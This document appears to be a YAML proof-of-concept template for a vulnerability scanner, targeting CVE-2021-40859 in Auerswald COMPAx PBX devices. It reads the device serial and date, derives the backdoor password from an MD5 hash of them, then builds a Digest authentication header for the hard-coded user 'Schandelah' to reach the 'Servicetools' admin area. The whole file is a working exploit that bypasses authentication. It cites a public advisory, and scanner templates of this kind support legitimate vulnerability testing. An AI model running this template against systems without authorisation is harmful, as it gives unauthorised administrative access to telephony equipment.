name: poc-yaml-auerswald-cve-2021-40859
manual: true
transport: http
set:
    dcnonce: randomLowercase(8)
rules:
    r1:
        request:
            method: GET
            path: "/about_state"
        expression: response.status == 200 && r'serial.*?\d+.,'.bmatches(response.body) && r'date.+?20[0-9][0-9].,'.bmatches(response.body)
        output:
            search: '"serial\":\"(?P<serial>.+?)\",\"date".bsubmatch(response.body)'
            serial: search["serial"]
            search: '"date\":\"(?P<date>.+?)\",\"macaddr".bsubmatch(response.body)'            
            date: search["date"]
            HA: serial + "r2d2" + date
            password: substr(md5(HA),0,7)            
    r2:
        request:
            method: GET
            path: "/tree"
        expression: response.status == 401
        output: 
            search: '"nonce=\"(?P<nonce>.*)\", opaque".submatch(response.headers["WWW-Authenticate"])'
            nonce: search["nonce"]
            search: '"opaque=\"(?P<opaque>.*)\",algorithm".submatch(response.headers["WWW-Authenticate"])'            
            opaque: search["opaque"]
            cnonce: substr(md5(dcnonce),0,16)
            username: '"Schandelah"'
            OHA1: username + ":Auerswald:" + password
            HA1: md5(OHA1)
            resp: HA1 + ":" + nonce + ":" + "00000001" + ":" + cnonce + ":auth:a94ba59ccc1aaf76cedba69ce4d102d2"
            respmd5: md5(resp)
    r3:
        request:
            method: GET
            path: "/tree"
            follow_redirects: true
            headers:
                Authorization: Digest username="Schandelah", realm="Auerswald", nonce="{{nonce}}", uri="/tree", algorithm=MD5, response="{{respmd5}}", opaque="{{opaque}}", algorithm="MD5", qop=auth, nc=00000001, cnonce="{{cnonce}}"
        expression: response.status == 200 && response.body.bcontains(b"Servicetools")
expression: r1() && r2() && r3()
detail:
    author: Jarcis-cy(https://github.com/jarcis-cy)
    links:
        - https://www.redteam-pentesting.de/en/advisories/rt-sa-2021-007/-auerswald-compact-multiple-backdoors
    summary: 'username:Schandelah;password:{{password}}'